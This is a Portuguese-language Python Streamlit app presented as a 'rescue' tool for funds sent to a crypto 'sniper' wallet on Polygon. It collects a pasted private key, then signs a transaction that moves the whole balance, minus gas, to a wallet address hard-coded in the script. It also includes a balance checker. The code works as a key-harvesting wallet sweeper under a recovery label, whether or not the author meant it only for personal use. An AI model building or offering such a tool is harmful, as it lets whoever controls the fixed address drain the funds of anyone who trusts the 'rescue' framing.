import streamlit as st
from web3 import Web3
from eth_account import Account

W3 = Web3(Web3.HTTPProvider("https://polygon-rpc.com"))
st.set_page_config(page_title="GUARDION v36.0 - RESGATE", layout="wide")

st.title("🚨 CENTRAL DE RESGATE E RASTREIO")

# 1. DESTINO MESTRE
carteira_destino = "0xd885c5f2bbe54d3a7d4b2a401467120137f0ccbe"
st.write(f"🎯 O dinheiro deve cair em: `{carteira_destino}`")

st.divider()

# 2. RESGATE POR CHAVE PRIVADA (A FORMA MAIS SEGURA)
st.subheader("🔑 Resgate por Chave Privada")
st.write("Se você tem a Private Key do sniper onde mandou o dinheiro, cole abaixo:")
pk_input = st.text_input("Cole a Private Key aqui:", type="password")

if st.button("💸 FORÇAR SAQUE IMEDIATO"):
    if pk_input:
        try:
            acc = Account.from_key(pk_input)
            saldo = W3.eth.get_balance(acc.address)
            st.write(f"Endereço da Chave: `{acc.address}`")
            st.write(f"Saldo encontrado: **{W3.from_wei(saldo, 'ether')} POL**")
            
            if saldo > 0:
                gas_price = int(W3.eth.gas_price * 2.0)
                taxa = gas_price * 21000
                tx = {
                    'nonce': W3.eth.get_transaction_count(acc.address),
                    'to': W3.to_checksum_address(carteira_destino),
                    'value': saldo - taxa,
                    'gas': 21000,
                    'gasPrice': gas_price,
                    'chainId': 137
                }
                signed = W3.eth.account.sign_transaction(tx, pk_input)
                h = W3.eth.send_raw_transaction(signed.raw_transaction)
                st.success(f"✅ ENVIADO! Hash: {W3.to_hex(h)}")
                st.balloons()
            else:
                st.error("Esta chave não tem saldo (POL) para sacar.")
        except Exception as e:
            st.error(f"Erro: {e}")

st.divider()

# 3. VERIFICADOR DE SALDO (RAIO-X)
st.subheader("🔍 Raio-X de Endereço")
addr_check = st.text_input("Cole o endereço do Sniper aqui para ver se o dinheiro está nele:")
if st.button("Checar Saldo"):
    try:
        b = W3.from_wei(W3.eth.get_balance(addr_check), 'ether')
        if b > 0:
            st.success(f"O dinheiro ESTÁ aqui: {b} POL")
            st.info("Para tirar, você precisa da Chave Privada deste endereço.")
        else:
            st.error("Saldo zero neste endereço.")
    except: st.error("Endereço inválido.")